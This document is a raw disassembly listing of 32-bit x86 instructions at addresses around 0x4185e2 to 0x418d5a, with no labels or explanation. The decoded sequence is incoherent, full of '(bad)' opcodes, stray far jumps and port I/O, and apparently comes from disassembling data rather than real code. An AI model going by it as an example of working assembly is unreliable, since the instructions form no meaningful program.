  4185e2:	mov    fs,WORD PTR [ecx+0x6f819c9b]
  4185e8:	push   ss
  4185e9:	sub    al,0x99
  4185eb:	shl    BYTE PTR [edx-0x648656ea],1
  4185f1:	scas   eax,DWORD PTR es:[edi]
  4185f2:	retf   0x1320
  4185f5:	aad    0x59
  4185f7:	sbb    ebx,DWORD PTR [ebx+0x71143c1]
  4185fd:	mov    dl,0x70
  4185ff:	jns    0x418613
  418601:	std    
  418602:	adc    edi,DWORD PTR [edx+0x406a1e04]
  418608:	or     DWORD PTR [ecx-0x1264e608],esi
  41860e:	(bad)
  418611:	cmp    edi,ebp
  418613:	xchg   ecx,eax
  418614:	call   0xa8508df9
  418619:	cwde   
  41861a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41861b:	sub    eax,0x7a04585c
  418620:	scas   al,BYTE PTR es:[edi]
  418621:	sbb    eax,0x39eb3c09
  418626:	es test al,0xfb
  418629:	push   edx
  41862a:	shl    BYTE PTR [eiz*4+0x7839a838],1
  418631:	retf   0x2fdd
  418634:	pop    ebp
  418635:	pop    esp
  418636:	mov    ch,0x49
  418638:	push   ebp
  418639:	fwait
  41863a:	rcl    DWORD PTR [edi-0x14bf010c],0x9b
  418641:	lock (bad) 
  418643:	mov    dl,BYTE PTR [edx-0x3f93d810]
  418649:	xlat   BYTE PTR ds:[ebx]
  41864a:	iret   
  41864b:	mov    edi,0xc69bde4f
  418650:	jns    0x4185d3
  418652:	push   0xffffffa2
  418654:	in     eax,0x47
  418656:	nop
  418657:	pop    ebx
  418658:	lock cs retf 
  41865b:	iret   
  41865c:	arpl   WORD PTR [ecx+0x5a],si
  41865f:	dec    esp
  418660:	fild   DWORD PTR [esi]
  418662:	mov    ebx,0x6fec71f2
  418667:	pop    ecx
  418668:	sbb    bh,BYTE PTR [esi]
  41866a:	xchg   edi,eax
  41866b:	cmp    edx,DWORD PTR [edi]
  41866d:	add    al,0x6
  41866f:	pushf  
  418670:	jmp    0x41869e
  418672:	dec    esp
  418673:	dec    esi
  418674:	sbb    ecx,esp
  418676:	push   esi
  418677:	aas    
  418678:	loopne 0x41865a
  41867a:	cwde   
  41867b:	push   ebp
  41867c:	push   esi
  41867d:	mov    esp,0xc31bcb60
  418682:	mov    ?,esi
  418684:	fwait
  418685:	pop    eax
  418686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418687:	mov    ecx,esp
  418689:	inc    esp
  41868a:	fdiv   DWORD PTR [ecx+0x57a0ddae]
  418690:	push   edx
  418691:	(bad)  
  418692:	in     eax,dx
  418693:	dec    ebp
  418694:	mov    ecx,0xef2c9026
  418699:	out    dx,eax
  41869a:	jmp    0x41870c
  41869c:	rcl    BYTE PTR [edi+0x67cb49fa],cl
  4186a2:	cmp    ch,BYTE PTR [esp+ebx*4+0x6e]
  4186a6:	js     0x418670
  4186a8:	fwait
  4186a9:	jnp    0x41865b
  4186ab:	and    edx,eax
  4186ad:	xchg   ecx,eax
  4186ae:	clc    
  4186af:	push   edi
  4186b0:	xchg   edx,eax
  4186b1:	fimul  WORD PTR [edx-0x1]
  4186b4:	push   ss
  4186b5:	inc    edx
  4186b6:	mov    esp,0x93c3fa8b
  4186bb:	pop    ds
  4186bc:	mov    ah,bl
  4186be:	fiadd  WORD PTR cs:[ebp+ebx*8+0x73]
  4186c3:	xchg   edx,eax
  4186c4:	mov    ch,0x6c
  4186c6:	ja     0x4186be
  4186c8:	mov    edi,DWORD PTR [edx]
  4186ca:	je     0x41869b
  4186cc:	jbe    0x4186ac
  4186ce:	or     eax,ebx
  4186d0:	dec    edi
  4186d1:	lods   eax,DWORD PTR ds:[esi]
  4186d2:	(bad)  
  4186d3:	(bad)  
  4186d4:	push   ss
  4186d5:	dec    ebp
  4186d6:	fwait
  4186d7:	or     eax,0x4d51dc92
  4186dc:	pop    ss
  4186dd:	xchg   ebp,eax
  4186de:	xor    DWORD PTR [edx],ebp
  4186e0:	cld    
  4186e1:	(bad)  
  4186e2:	(bad)  
  4186e3:	dec    ecx
  4186e4:	mov    ds:0x34fe90ef,al
  4186e9:	xchg   ecx,eax
  4186ea:	mov    ch,0xdc
  4186ec:	sahf   
  4186ed:	mov    ah,0x49
  4186ef:	cmc    
  4186f0:	push   ecx
  4186f1:	inc    esi
  4186f2:	fs retf 
  4186f4:	jne    0x4186b3
  4186f6:	jl     0x41871d
  4186f8:	sbb    esi,0xffffff82
  4186fb:	js     0x418716
  4186fd:	sbb    edi,edx
  4186ff:	retf   0x59d0
  418702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418703:	jnp    0x418694
  418705:	inc    edi
  418706:	nop
  418707:	inc    eax
  418708:	mul    BYTE PTR [ebx+0x61]
  41870b:	mov    al,0x9c
  41870d:	(bad)  
  41870f:	aad    0x23
  418711:	outs   dx,BYTE PTR ds:[esi]
  418712:	leave  
  418713:	sti    
  418714:	lock dec ebp
  418716:	aam    0x6a
  418718:	(bad)  
  418719:	sbb    eax,0xaa5820bc
  41871e:	nop
  41871f:	inc    DWORD PTR [edi+eiz*1]
  418722:	xchg   ebp,eax
  418723:	inc    eax
  418724:	(bad)  
  418725:	pop    ss
  418726:	mov    ch,0x7e
  418728:	and    al,BYTE PTR [ebp-0x10]
  41872b:	mov    ebp,0x6d30fe8e
  418730:	imul   bl
  418732:	lods   al,BYTE PTR ds:[esi]
  418733:	cmp    BYTE PTR [ecx+0x3d],bh
  418736:	pop    ss
  418737:	inc    ecx
  418738:	les    ebp,FWORD PTR [eax+eax*4-0x1]
  41873c:	out    dx,eax
  41873d:	jo     0x4186d8
  41873f:	cmp    edi,edi
  418741:	fnsave [edi-0x2d]
  418744:	pop    esi
  418745:	aam    0xee
  418747:	sbb    al,0xbc
  418749:	jl     0x4186db
  41874b:	jnp    0x418719
  41874d:	int    0x2
  41874f:	inc    esi
  418750:	mov    esi,0xfe402457
  418755:	out    0xca,al
  418757:	sub    BYTE PTR [ebp+0x5d],dl
  41875a:	nop
  41875b:	ins    BYTE PTR es:[edi],dx
  41875c:	(bad)  
  41875d:	xlat   BYTE PTR ds:[ebx]
  41875e:	and    bh,BYTE PTR [ebx]
  418760:	pushf  
  418761:	pushf  
  418762:	jns    0x41872f
  418764:	daa    
  418765:	mov    WORD PTR [edi+0x5cb46b5e],fs
  41876b:	data16 lods al,BYTE PTR ds:[esi]
  41876d:	mov    ecx,0x916a8a10
  418772:	dec    ecx
  418773:	xor    dh,dl
  418775:	adc    edx,DWORD PTR [eax+0x2881e02d]
  41877b:	fnstsw WORD PTR [esp+esi*2+0x677665ba]
  418782:	fs or  dh,dl
  418785:	xchg   ecx,eax
  418786:	call   0x6e3f:0x9edc4e81
  41878d:	icebp  
  41878e:	popf   
  41878f:	dec    ecx
  418790:	mov    ah,0x6a
  418792:	test   edi,esi
  418794:	push   ebp
  418795:	fmulp  st(3),st
  418797:	xchg   BYTE PTR [esi-0x2e],al
  41879a:	fucom  st(1)
  41879c:	data16 xlat BYTE PTR ds:[ebx]
  41879e:	lods   al,BYTE PTR ds:[esi]
  41879f:	aas    
  4187a0:	xchg   ebx,eax
  4187a1:	rcl    eax,1
  4187a3:	mov    BYTE PTR [esi+0x7e033f00],dh
  4187a9:	ficom  WORD PTR [ecx+esi*8+0x1d]
  4187ad:	lods   eax,DWORD PTR fs:[esi]
  4187af:	int    0x4f
  4187b1:	int    0x97
  4187b3:	xchg   BYTE PTR [ebp+edx*2-0x15a46814],bh
  4187ba:	(bad)  
  4187bb:	cld    
  4187bc:	add    bl,dh
  4187be:	in     eax,0x96
  4187c0:	ret    
  4187c1:	dec    eax
  4187c2:	in     eax,0x5b
  4187c4:	scas   eax,DWORD PTR es:[edi]
  4187c5:	sbb    al,0x28
  4187c7:	push   esp
  4187c8:	mov    bh,0xe
  4187ca:	dec    ecx
  4187cb:	test   DWORD PTR [edi],esi
  4187cd:	pop    esp
  4187ce:	rcl    BYTE PTR [edx+0x34ebbd37],1
  4187d4:	out    dx,eax
  4187d5:	jmp    0x41882d
  4187d7:	test   al,0x3a
  4187d9:	retf   
  4187da:	jo     0x418848
  4187dc:	les    esi,FWORD PTR [ebx+0x37a28302]
  4187e2:	cmp    BYTE PTR [edi+0x680a6fc],bl
  4187e8:	cdq    
  4187e9:	mov    dl,0x27
  4187eb:	dec    edx
  4187ec:	pusha  
  4187ed:	add    eax,0xe5112d1c
  4187f2:	pop    esi
  4187f3:	jecxz  0x41879b
  4187f5:	mul    edi
  4187f7:	loope  0x4187c9
  4187f9:	pop    ebp
  4187fa:	pop    edx
  4187fb:	mov    dl,bh
  4187fd:	outs   dx,BYTE PTR ds:[esi]
  4187fe:	imul   ebx,edx,0x4d8b5920
  418804:	pusha  
  418805:	sub    DWORD PTR [esi+0x1e],0x5618a7c6
  41880c:	loopne 0x418808
  41880e:	lods   al,BYTE PTR ds:[esi]
  41880f:	cli    
  418810:	and    ah,cl
  418812:	nop
  418813:	mov    esi,0x4cbdda86
  418818:	jns    0x4187f8
  41881a:	lods   eax,DWORD PTR ds:[esi]
  41881b:	sub    eax,0x88285e94
  418820:	ins    DWORD PTR es:[edi],dx
  418821:	cmp    eax,0x978d8f90
  418826:	dec    esi
  418827:	enter  0x3081,0x21
  41882b:	dec    edx
  41882c:	jp     0x418821
  41882e:	mov    eax,0x10125e6a
  418833:	lea    ebx,[ebx-0x6097fa93]
  418839:	cmp    BYTE PTR [ecx],al
  41883b:	int    0xdc
  41883d:	push   edi
  41883e:	lock dec edx
  418840:	cmp    DWORD PTR [ecx+eiz*1],ecx
  418843:	push   esi
  418844:	mov    edi,0x1929de1c
  418849:	mov    cl,0x71
  41884b:	sbb    DWORD PTR [ebx-0x15],edx
  41884e:	int    0xdf
  418850:	fwait
  418851:	xchg   ebp,eax
  418852:	fnstenv [eax]
  418854:	stos   DWORD PTR es:[edi],eax
  418855:	shr    BYTE PTR [edi],1
  418857:	inc    esp
  418858:	jne    0x418838
  41885a:	add    al,0x86
  41885c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41885d:	sub    eax,0x3c3506b8
  418862:	add    DWORD PTR [ecx+0x7d85d59b],edi
  418868:	add    esi,DWORD PTR [eax-0x5d]
  41886b:	ficom  WORD PTR [eax]
  41886d:	jecxz  0x4188b1
  41886f:	enter  0x7514,0xd8
  418873:	or     DWORD PTR [edx-0x6443601f],eax
  418879:	cdq    
  41887a:	and    al,0x2d
  41887c:	jns    0x41886d
  41887e:	(bad)  
  41887f:	mov    al,ds:0x81bddfc
  418884:	cmp    al,0xf9
  418886:	adc    eax,0x905fede2
  41888b:	lea    edi,ds:[esp+edi*1]
  41888f:	sbb    eax,0x4a4a80c1
  418894:	mov    edx,0x7a943544
  418899:	leave  
  41889a:	es inc eax
  41889c:	and    DWORD PTR [eax-0x62],0xffffffe4
  4188a0:	or     ecx,DWORD PTR [edx+0x7f75ca73]
  4188a6:	cmc    
  4188a7:	and    dl,BYTE PTR [esi-0x21]
  4188aa:	and    DWORD PTR [esi],edx
  4188ac:	mov    ds:0xa8d51acc,eax
  4188b1:	(bad)  [eax+ecx*1-0x49]
  4188b5:	loop   0x4188f6
  4188b7:	xchg   esi,eax
  4188b8:	mov    esp,0x5f0a08a8
  4188bd:	ins    DWORD PTR es:[edi],dx
  4188be:	leave  
  4188bf:	ins    DWORD PTR es:[edi],dx
  4188c0:	xor    eax,DWORD PTR [edi+0x4e92fa31]
  4188c6:	sub    eax,0x7eb79bd3
  4188cb:	dec    eax
  4188cc:	and    dh,ah
  4188ce:	cdq    
  4188cf:	cli    
  4188d0:	popa   
  4188d1:	(bad)  
  4188d3:	das    
  4188d4:	outs   dx,BYTE PTR ds:[esi]
  4188d5:	sub    al,0x36
  4188d7:	aad    0x95
  4188d9:	nop
  4188da:	nop
  4188db:	pop    esi
  4188dc:	mov    bh,0x10
  4188de:	or     BYTE PTR [edx+0x4a4ed08b],bh
  4188e4:	nop
  4188e5:	outs   dx,DWORD PTR ds:[esi]
  4188e6:	pop    eax
  4188e7:	jle    0x418922
  4188e9:	jle    0x4188a7
  4188eb:	and    DWORD PTR [ebx-0x332049b8],ebx
  4188f1:	pusha  
  4188f2:	cmp    edx,edi
  4188f4:	repz frstor [edx]
  4188f7:	idiv   BYTE PTR [ebp-0x639aca54]
  4188fd:	ss xchg edi,eax
  4188ff:	dec    ebp
  418900:	jnp    0x4188b3
  418902:	push   edx
  418903:	mov    ecx,0xeddff612
  418908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418909:	pop    ebx
  41890a:	pushf  
  41890b:	dec    ecx
  41890c:	dec    eax
  41890d:	ret    0xb045
  418910:	(bad)  
  418911:	push   eax
  418912:	pop    eax
  418913:	pop    esp
  418914:	sahf   
  418915:	mov    eax,ds:0x61aacced
  41891a:	and    DWORD PTR [edx],eax
  41891c:	rol    DWORD PTR [edx+0x77],1
  41891f:	push   ebp
  418920:	in     al,0xcd
  418922:	popa   
  418923:	aaa    
  418924:	and    dh,BYTE PTR [eax]
  418926:	inc    ebx
  418927:	ficomp DWORD PTR [esp+esi*2+0x5b]
  41892b:	mov    BYTE PTR [ebx-0x7e249d2f],bl
  418931:	sbb    BYTE PTR [edi+0x34de22d3],cl
  418937:	mov    ch,0xfa
  418939:	push   esp
  41893a:	cmp    dh,BYTE PTR [eax-0x70]
  41893d:	fs xchg ebx,eax
  41893f:	stos   DWORD PTR es:[edi],eax
  418940:	pop    esp
  418941:	pusha  
  418942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418943:	cli    
  418944:	daa    
  418945:	(bad)  
  418946:	pop    ds
  418947:	push   es
  418948:	cmp    esi,ebx
  41894a:	ja     0x4189ae
  41894c:	jmp    0x4189a9
  41894e:	into   
  41894f:	leave  
  418950:	retf   0xecd4
  418953:	push   es
  418954:	rcr    ebp,0x8
  418957:	mov    WORD PTR [ebp+0x77],?
  41895a:	sub    DWORD PTR [ebp-0x55],0xffffffdd
  41895e:	fstp   DWORD PTR [ebx]
  418960:	pop    ebx
  418961:	outs   dx,BYTE PTR ds:[esi]
  418962:	test   eax,0x93583381
  418967:	xchg   esi,eax
  418968:	in     eax,dx
  418969:	sbb    eax,0x8dc63025
  41896e:	test   BYTE PTR ds:[eax+0x4bb3f7e2],ah
  418975:	repnz push esi
  418977:	or     dh,BYTE PTR [esi]
  418979:	int    0x81
  41897b:	bound  ebx,QWORD PTR [ebx+0x6102b210]
  418981:	and    ch,cl
  418983:	mov    ch,BYTE PTR [ebp+ebx*8+0x7c77c095]
  41898a:	retf   
  41898b:	pop    ds
  41898c:	hlt    
  41898d:	xchg   edi,eax
  41898e:	or     bl,BYTE PTR [esi+0x28cfedba]
  418994:	fild   DWORD PTR [eax+0x11b7e35c]
  41899a:	and    BYTE PTR [ebx-0x1e],cl
  41899d:	jno    0x418953
  41899f:	sub    al,0xd7
  4189a1:	aam    0xd4
  4189a3:	test   eax,0x6895af5b
  4189a8:	cmp    al,0x81
  4189aa:	ins    DWORD PTR es:[edi],dx
  4189ab:	dec    ebx
  4189ac:	fwait
  4189ad:	pop    ebp
  4189ae:	mov    ebx,DWORD PTR [ebp+0x499b38a1]
  4189b4:	inc    ebp
  4189b5:	fsub   DWORD PTR ds:0xed1579a2
  4189bb:	pop    ebp
  4189bc:	fwait
  4189bd:	pop    ss
  4189be:	pushf  
  4189bf:	cld    
  4189c0:	ins    BYTE PTR es:[edi],dx
  4189c1:	and    eax,0xde2b8aae
  4189c6:	popf   
  4189c7:	iret   
  4189c8:	add    ebp,ebx
  4189ca:	sub    BYTE PTR [ecx-0x4b6fd41a],bh
  4189d0:	xchg   ecx,eax
  4189d1:	sbb    al,BYTE PTR [ecx-0x1f]
  4189d4:	ss (bad) 
  4189d6:	and    eax,0xf32b844a
  4189db:	int    0xae
  4189dd:	mov    esi,0xc79b274d
  4189e2:	xchg   ebx,eax
  4189e3:	ja     0x418a47
  4189e5:	popa   
  4189e6:	call   0x376f:0x75de2500
  4189ed:	adc    ch,BYTE PTR [eax+0x31]
  4189f0:	(bad)  
  4189f2:	(bad)  
  4189f3:	push   cs
  4189f4:	xchg   ecx,eax
  4189f5:	push   ecx
  4189f6:	sub    eax,0x804c9aae
  4189fb:	dec    ebp
  4189fc:	ins    DWORD PTR es:[edi],dx
  4189fd:	mov    ds:0xf271da0d,al
  418a02:	aas    
  418a03:	add    DWORD PTR [ecx],esp
  418a05:	in     al,dx
  418a06:	(bad)  
  418a07:	xchg   edi,eax
  418a08:	jl     0x4189f4
  418a0a:	and    al,0xb6
  418a0c:	gs daa 
  418a0e:	pop    ecx
  418a0f:	dec    edx
  418a10:	push   edi
  418a11:	fisubr DWORD PTR [edi+0x53]
  418a14:	lods   al,BYTE PTR ds:[esi]
  418a15:	lods   eax,DWORD PTR ds:[esi]
  418a16:	imul   eax,DWORD PTR [edx],0x4dd1829b
  418a1c:	outs   dx,BYTE PTR ds:[esi]
  418a1d:	aas    
  418a1e:	or     DWORD PTR [edx],0xed83ddaa
  418a24:	mov    ebx,0x5dbb7bb5
  418a29:	dec    esp
  418a2a:	nop
  418a2b:	(bad)
  418a2f:	retf   0x777a
  418a32:	xchg   DWORD PTR [esi-0x17],esp
  418a35:	or     al,0x42
  418a37:	mov    cl,BYTE PTR [ecx-0x2756f0de]
  418a3d:	stos   DWORD PTR es:[edi],eax
  418a3e:	mov    esi,0xcb0374ac
  418a43:	dec    ecx
  418a44:	sbb    al,0x64
  418a46:	mov    ebp,0xce9e04f8
  418a4b:	dec    ecx
  418a4c:	pop    edi
  418a4d:	xchg   BYTE PTR [edx-0x5cbaecb0],bl
  418a53:	enter  0xad9b,0x87
  418a57:	frstor [esi+ebp*2-0x7e]
  418a5b:	sar    bl,cl
  418a5d:	fst    st(6)
  418a5f:	cli    
  418a60:	mov    ecx,0x5eff9bf5
  418a65:	clc    
  418a66:	retf   0xe11b
  418a69:	fs jbe 0x418a85
  418a6c:	repz xor ah,BYTE PTR [eax+0x66]
  418a70:	cmp    ah,BYTE PTR [ebx]
  418a72:	imul   ecx,DWORD PTR [edx-0x71],0x21059c75
  418a79:	ins    DWORD PTR es:[edi],dx
  418a7a:	push   ds
  418a7b:	add    al,0xa9
  418a7d:	adc    DWORD PTR [eax-0x40],edi
  418a80:	pop    ebx
  418a81:	sahf   
  418a82:	jle    0x418a43
  418a84:	or     DWORD PTR [eax-0x1e],edx
  418a87:	dec    ecx
  418a88:	hlt    
  418a89:	scas   al,BYTE PTR es:[edi]
  418a8a:	push   cs
  418a8b:	push   cs
  418a8c:	inc    edx
  418a8d:	popf   
  418a8e:	jg     0x418a63
  418a90:	fwait
  418a91:	loopne 0x418a88
  418a93:	pop    ecx
  418a94:	mov    bl,0xb1
  418a96:	xor    al,BYTE PTR [edx]
  418a98:	push   ecx
  418a99:	jecxz  0x418aea
  418a9b:	aas    
  418a9c:	lods   al,BYTE PTR ds:[esi]
  418a9d:	pop    esi
  418a9e:	ror    DWORD PTR [ecx],0xb8
  418aa1:	push   ds
  418aa2:	in     eax,dx
  418aa3:	jnp    0x418a43
  418aa5:	xlat   BYTE PTR ds:[ebx]
  418aa6:	fcom   DWORD PTR [edi+0x57]
  418aa9:	inc    ebp
  418aaa:	xor    al,0xe2
  418aac:	std    
  418aad:	inc    ebx
  418aae:	mov    eax,0xc75e3a49
  418ab3:	jmp    0x35f7449c
  418ab8:	fwait
  418ab9:	mov    edx,0x79618db6
  418abe:	jne    0x418a5b
  418ac0:	pop    ebx
  418ac1:	fdivp  st(2),st
  418ac3:	pop    ds
  418ac4:	jae    0x418a94
  418ac6:	and    bl,BYTE PTR [esi]
  418ac8:	inc    ebx
  418ac9:	inc    esp
  418aca:	add    edx,DWORD PTR [ebx]
  418acc:	fwait
  418acd:	lods   eax,DWORD PTR ds:[esi]
  418ace:	loop   0x418a5c
  418ad0:	sahf   
  418ad1:	and    eax,0xddf85788
  418ad6:	lods   eax,DWORD PTR ds:[esi]
  418ad7:	bound  ebx,QWORD PTR [esp+edx*2+0x5]
  418adb:	outs   dx,DWORD PTR ds:[esi]
  418adc:	sub    DWORD PTR [edx],esi
  418ade:	mov    ds:0x9021580f,al
  418ae3:	or     al,0x6f
  418ae5:	jecxz  0x418b52
  418ae7:	int    0x3e
  418ae9:	fisub  WORD PTR [ebp-0x6]
  418aec:	add    DWORD PTR [eax],ecx
  418aee:	sub    ch,BYTE PTR [ebp-0x716c3471]
  418af4:	pop    ecx
  418af5:	cmp    BYTE PTR [edx+0x21ce0a75],bl
  418afb:	mov    dl,0xe1
  418afd:	pop    eax
  418afe:	sbb    eax,0x10996084
  418b03:	out    0x74,eax
  418b05:	push   ss
  418b06:	mov    dl,0xb5
  418b08:	xchg   esp,eax
  418b09:	xor    BYTE PTR [eax+0x32e0df14],dl
  418b0f:	jns    0x418b0a
  418b11:	and    cl,BYTE PTR [edx-0x46]
  418b14:	fcomp  st(5)
  418b16:	sub    edx,DWORD PTR [edx+0x1a41f14f]
  418b1c:	icebp  
  418b1d:	xor    dl,BYTE PTR [eax+0xcc07c3c]
  418b23:	push   ds
  418b24:	jmp    0xf4f1:0xa04d204f
  418b2b:	jae    0x418b77
  418b2d:	push   esi
  418b2e:	nop
  418b2f:	addr16 mov esp,0xb2dfc96f
  418b35:	push   es
  418b36:	pop    ebx
  418b37:	pop    ecx
  418b38:	lahf   
  418b39:	inc    eax
  418b3a:	xchg   ebx,eax
  418b3b:	lea    ebx,[eax+0x3a]
  418b3e:	call   0xd32e:0xa1711049
  418b45:	es xchg ecx,eax
  418b47:	(bad)  
  418b48:	adc    DWORD PTR [esi+0x286973e],esi
  418b4e:	test   BYTE PTR [ecx],bl
  418b50:	xchg   edx,eax
  418b51:	icebp  
  418b52:	std    
  418b53:	add    ah,BYTE PTR [ebx+0x7d53b6dd]
  418b59:	call   0x6a7e:0xab8c27ca
  418b60:	hlt    
  418b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b62:	nop
  418b63:	stos   DWORD PTR es:[edi],eax
  418b64:	mov    dh,0x70
  418b66:	lods   eax,DWORD PTR ds:[esi]
  418b67:	ins    BYTE PTR es:[edi],dx
  418b68:	lds    ebx,FWORD PTR [ebx+0x41]
  418b6b:	dec    edx
  418b6c:	inc    esi
  418b6e:	cmp    BYTE PTR [esi+0x617ab4e3],bl
  418b74:	mov    cl,0x37
  418b76:	jecxz  0x418bda
  418b78:	stos   BYTE PTR es:[edi],al
  418b79:	jne    0x418ba8
  418b7b:	jmp    0xe54a:0xca024d
  418b82:	out    0xf9,eax
  418b84:	jne    0x418b2b
  418b86:	pop    es
  418b87:	cli    
  418b88:	jp     0x418b3b
  418b8a:	sbb    BYTE PTR [edi],cl
  418b8c:	mov    ds:0xc6029632,al
  418b91:	xchg   DWORD PTR ds:0xdb4f5b8f,esi
  418b97:	jne    0x418c01
  418b99:	fsubrp st(3),st
  418b9b:	mov    eax,ds:0x636bca57
  418ba0:	sub    esp,ecx
  418ba2:	lods   al,BYTE PTR ds:[esi]
  418ba3:	mov    bl,0xc3
  418ba5:	sbb    BYTE PTR [ebp+0x50a3ee15],dl
  418bab:	pop    edx
  418bac:	inc    eax
  418bad:	xchg   ecx,eax
  418bae:	add    BYTE PTR [ebp-0x29],cl
  418bb1:	jg     0x418b61
  418bb3:	pop    ebp
  418bb4:	and    DWORD PTR [ecx-0x54ac3e6f],esi
  418bba:	pop    ds
  418bbb:	cwde   
  418bbc:	mov    edx,0xe7dd5802
  418bc1:	fst    st(4)
  418bc3:	ins    DWORD PTR es:[edi],dx
  418bc4:	js     0x418b78
  418bc6:	clc    
  418bc7:	clc    
  418bc8:	ret    0x2018
  418bcb:	jge    0x418b68
  418bcd:	jge    0x418c09
  418bcf:	pop    ss
  418bd0:	and    al,0x14
  418bd2:	shr    BYTE PTR [edx-0x6],1
  418bd5:	sbb    al,0xbe
  418bd7:	and    DWORD PTR [edx-0x4f6987ca],0x8602ce7d
  418be1:	inc    eax
  418be2:	nop
  418be3:	(bad)  
  418be4:	adc    al,0xb0
  418be6:	ja     0x418bcd
  418be8:	adc    eax,0xd54a807f
  418bed:	pop    eax
  418bee:	int3   
  418bef:	daa    
  418bf0:	mov    WORD PTR [ebx+0x7a],fs
  418bf3:	dec    ecx
  418bf4:	(bad)  
  418bf7:	rcr    BYTE PTR [ebx],0xc0
  418bfa:	pop    esi
  418bfb:	push   es
  418bfc:	in     al,dx
  418bfd:	sbb    BYTE PTR [ebx-0x630464eb],ch
  418c03:	pusha  
  418c04:	jnp    0x418c4f
  418c06:	out    0x99,eax
  418c08:	fwait
  418c09:	sbb    eax,0x39f5ff62
  418c0e:	sar    DWORD PTR [ebx+0x3157ddef],cl
  418c14:	mov    esi,DWORD PTR [ebx+ebp*8-0x6fff13e9]
  418c1b:	(bad)  
  418c1c:	mov    ebp,0x38ad177c
  418c21:	fcmovbe st,st(0)
  418c23:	dec    ecx
  418c24:	dec    ecx
  418c25:	and    dh,BYTE PTR [ecx-0xba658a2]
  418c2b:	lock mov ds:0x52ec8596,al
  418c31:	test   eax,0xacab6830
  418c36:	mov    DWORD PTR [edx-0x1d],ecx
  418c39:	clc    
  418c3a:	mov    esi,0x87c60c08
  418c3f:	add    eax,0xb6aece95
  418c44:	popw   ds
  418c46:	rcr    ah,1
  418c48:	push   ss
  418c49:	mov    al,0x4e
  418c4b:	push   esp
  418c4c:	rcr    ch,cl
  418c4e:	out    0xa4,al
  418c50:	sahf   
  418c51:	pop    es
  418c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c53:	ins    DWORD PTR es:[edi],dx
  418c54:	and    eax,0x53120f05
  418c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c5a:	nop
  418c5b:	push   ss
  418c5c:	xchg   esp,eax
  418c5d:	aas    
  418c5e:	pop    esp
  418c5f:	ror    DWORD PTR [ebx+0x7f],0x5
  418c63:	dec    edx
  418c64:	daa    
  418c65:	scas   eax,DWORD PTR es:[edi]
  418c66:	xor    eax,0xff423570
  418c6b:	scas   eax,DWORD PTR es:[edi]
  418c6c:	dec    ebx
  418c6d:	ficom  DWORD PTR [edi-0x6d3f08dc]
  418c73:	repnz cmp esi,DWORD PTR [ebx+edi*1]
  418c77:	and    ebp,DWORD PTR [ecx]
  418c79:	fcompp 
  418c7b:	test   al,0x94
  418c7d:	(bad)  
  418c7e:	popa   
  418c7f:	ror    BYTE PTR ds:0xe9b590aa,0xf8
  418c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c87:	inc    ebx
  418c88:	pop    ebp
  418c89:	xchg   DWORD PTR [eax],edx
  418c8b:	dec    edx
  418c8c:	adc    al,0x88
  418c8e:	scas   eax,DWORD PTR es:[edi]
  418c8f:	ror    esp,1
  418c91:	fbstp  TBYTE PTR ds:0xcd1d9b9b
  418c97:	mov    ah,0x63
  418c99:	out    dx,al
  418c9a:	ss ins DWORD PTR es:[edi],dx
  418c9c:	(bad)  
  418c9e:	mov    bh,0xa
  418ca0:	not    DWORD PTR [esi+0x5]
  418ca3:	push   0x58
  418ca5:	xchg   ecx,eax
  418ca6:	nop
  418ca7:	sbb    DWORD PTR [eax],ebp
  418ca9:	mov    BYTE PTR [ebx],bl
  418cab:	cmp    eax,0x50d22833
  418cb0:	(bad)  
  418cb1:	or     DWORD PTR [esi-0x73],edx
  418cb4:	arpl   WORD PTR [esi+0x12c4c1de],di
  418cba:	add    ebp,DWORD PTR [edi-0x59]
  418cbd:	mov    esi,0xea3ffeab
  418cc2:	push   esi
  418cc3:	pop    esi
  418cc4:	push   ecx
  418cc5:	jae    0x418d16
  418cc7:	in     al,dx
  418cc8:	fwait
  418cc9:	sub    BYTE PTR [ecx-0x7f],bh
  418ccc:	inc    esp
  418ccd:	rcr    DWORD PTR [edx+edi*2-0x65],cl
  418cd1:	bnd jae 0x418cd0
  418cd4:	mov    dh,0x49
  418cd6:	outs   dx,BYTE PTR ds:[esi]
  418cd7:	inc    edi
  418cd8:	jp     0x418cd5
  418cda:	dec    edi
  418cdb:	enter  0x5f08,0x1e
  418cdf:	ret    0xe539
  418ce2:	adc    BYTE PTR [ebx-0x39e5a20c],ch
  418ce8:	in     eax,0xcf
  418cea:	sub    DWORD PTR [ecx-0x2d],ecx
  418ced:	fucomp st(4)
  418cef:	xor    BYTE PTR [edx+eiz*8-0x998c313],dh
  418cf6:	(bad)  
  418cf7:	adc    bh,BYTE PTR [eax+eax*2+0x5bf5d894]
  418cfe:	mov    ds:0x98190849,al
  418d03:	mov    edi,0x8a039461
  418d08:	xor    ebx,0xffffff8f
  418d0b:	out    0x66,al
  418d0d:	aam    0xcf
  418d0f:	or     ecx,DWORD PTR [edx+0x5549959c]
  418d15:	sbb    ebp,ebx
  418d17:	ss in  eax,0x99
  418d1a:	ret    0xd6b5
  418d1d:	fisttp DWORD PTR [ebx]
  418d1f:	retf   0xa618
  418d22:	mov    ecx,0x2c90983b
  418d27:	dec    ebx
  418d28:	and    al,0xfe
  418d2a:	sub    DWORD PTR [ebx],ebx
  418d2c:	inc    esi
  418d2d:	inc    ecx
  418d2e:	mov    dl,0xa9
  418d30:	mov    bh,0x2f
  418d32:	xchg   ecx,eax
  418d33:	and    esp,DWORD PTR [edi+0x40a05d6]
  418d39:	mov    ds:0xddfddb68,eax
  418d3e:	mov    dl,0x2d
  418d40:	xor    DWORD PTR [eax+0x20522249],ebp
  418d46:	nop
  418d47:	fmul   DWORD PTR [ebx+0x264dd037]
  418d4d:	pop    ds
  418d4e:	enter  0xfa4a,0x50
  418d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d53:	clc    
  418d54:	push   esi
  418d55:	push   0xe9171656
  418d5a:	(bad)  
